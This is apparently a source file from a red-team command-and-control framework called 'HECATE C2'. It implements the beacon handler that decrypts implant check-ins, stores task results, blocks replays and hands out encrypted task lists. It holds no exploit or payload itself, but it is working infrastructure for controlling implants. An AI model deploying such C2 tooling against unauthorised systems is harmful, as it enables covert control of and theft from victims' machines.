'use strict';

/**
 * HECATE C2 — Beacon Handler
 * The single entry point for all implant communication.
 * Called by the HTTP listener on POST /c2/beacon.
 *
 * Flow:
 *   1. Identify implant from X-Agent-ID header
 *   2. Decrypt request body with implant's key
 *   3. Validate message type
 *   4. Process: update beacon store, store results
 *   5. Claim pending tasks from queue
 *   6. Return encrypted tasklist (or empty)
 *
 * Returns { status, body } — listener writes these to the HTTP response.
 */

const protocol    = require('../implant/protocol');
const beaconStore = require('./beacon-store');
const taskQueue   = require('../implant/task-queue');
const taskBuilder = require('../tasks/task-builder');
const c2Store     = require('../storage/c2-store');
const crypto      = require('crypto');

const REPLAY_TTL_MS = 10 * 60 * 1000;
const REPLAY_MAX_PER_IMPLANT = 256;
const seenMessages = new Map();

let _eventBus = null;
function setEventBus(bus) { _eventBus = bus; }

/**
 * Handle an incoming beacon request.
 * @param {object} opts
 * @param {string}   opts.implantId     - from X-Agent-ID header
 * @param {string}   opts.rawBody       - base64-encrypted request body
 * @param {string}   opts.ip            - remote IP
 * @returns {{ status: number, body: string }} encrypted response body
 */
async function handle({ implantId, rawBody, ip }) {
  if (!implantId || typeof rawBody !== 'string' || !rawBody) return emptyResponse(null, 204);

  // ── 1. Look up implant key ────────────────────────────────────────────────
  const implantRecord = await c2Store.getImplant(implantId);
  if (!implantRecord) {
    // Unknown implant — reject silently (don't leak info) and do not allocate
    // replay-cache state for attacker-controlled implant IDs.
    return emptyResponse(null, 204);
  }

  if (implantRecord.state === 'killed') {
    _emit('c2:killed_implant_rejected', { implantId, ip });
    return emptyResponse(null, 204);
  }

  // Reject exact ciphertext replays before decrypting. AES-GCM provides integrity
  // but does not itself provide replay protection. Cache state is created only
  // for registered, non-killed implants.
  const now = Date.now();
  const digest = crypto.createHash('sha256').update(rawBody).digest('hex');
  const seen = seenMessages.get(implantId) ?? new Map();
  for (const [hash, ts] of seen) if (now - ts > REPLAY_TTL_MS) seen.delete(hash);
  if (seen.has(digest)) {
    _emit('c2:replay_rejected', { implantId, ip });
    return emptyResponse(null, 204);
  }
  seen.set(digest, now);
  while (seen.size > REPLAY_MAX_PER_IMPLANT) seen.delete(seen.keys().next().value);
  seenMessages.set(implantId, seen);

  const key = await c2Store.decryptImplantKey(implantRecord.key_enc);

  // ── 2. Decrypt ────────────────────────────────────────────────────────────
  let msg;
  try {
    msg = protocol.decrypt(rawBody, key);
  } catch {
    // Decryption failure — wrong key or tampered payload
    _emit('c2:decrypt_failure', { implantId, ip });
    return emptyResponse(null, 204); // silent reject
  }

  const engagementId = implantRecord.engagement_id;

  // ── 3. Dispatch by message type ───────────────────────────────────────────
  if (protocol.validateCheckin(msg)) {
    await _handleCheckin(implantId, engagementId, msg, ip, key, implantRecord);
  } else if (protocol.validateResult(msg)) {
    await _handleResults(implantId, engagementId, msg, key);
  } else {
    _emit('c2:invalid_message', { implantId, type: msg?.type ?? 'unknown' });
    return emptyResponse(key, 204);
  }

  // ── 4. Claim and return tasks ─────────────────────────────────────────────
  const tasks    = taskQueue.claim(implantId, 10);
  const sleepSec = implantRecord.sleep_sec ?? 30;
  const response = protocol.buildTasklist(
    tasks.map(t => ({ id: t.id, type: t.type, payload: t.payload })),
    sleepSec,
    implantRecord.jitter_pct ?? 20,
  );

  return { status: 200, body: protocol.encrypt(response, key) };
}

// ── Private handlers ──────────────────────────────────────────────────────────

async function _handleCheckin(implantId, engagementId, msg, ip, key, record) {
  const beacon = beaconStore.checkin(
    implantId, engagementId, msg.info, ip,
    record.sleep_sec, record.jitter_pct
  );

  // Update DB last-seen
  await c2Store.updateLastSeen(implantId);

  // If beacon state is newly active, emit to UI
  _emit('c2:checkin', {
    implantId, engagementId,
    info:   msg.info,
    ip,
    state:  beacon.state,
    queued: taskQueue.size(implantId),
  });
}

async function _handleResults(implantId, engagementId, msg, key) {
  for (const r of msg.results) {
    const parsed = {
      taskId:    r.taskId,
      output:    r.output   ?? '',
      exitCode:  r.exitCode ?? 0,
      error:     r.error    ?? null,
    };

    const task = c2Store.getTask(r.taskId);
    if (!task || task.implant_id !== implantId) {
      _emit('c2:invalid_result_task', { implantId, taskId: r.taskId });
      continue;
    }

    await c2Store.saveResult(r.taskId, implantId, parsed);

    _emit('c2:task_result', {
      implantId, engagementId,
      taskId:   r.taskId,
      exitCode: r.exitCode,
      hasOutput: (r.output?.length ?? 0) > 0,
      hasError:  !!r.error,
    });
  }
}

function emptyResponse(key, status) {
  if (!key) return { status, body: '' };
  const body = protocol.encrypt({ type: 'tasklist', tasks: [] }, key);
  return { status, body };
}

function _emit(event, data) {
  _eventBus?.emit(event, { ...data, ts: new Date().toISOString() });
}

function clearReplayCache() { seenMessages.clear(); }

module.exports = { handle, setEventBus, clearReplayCache };
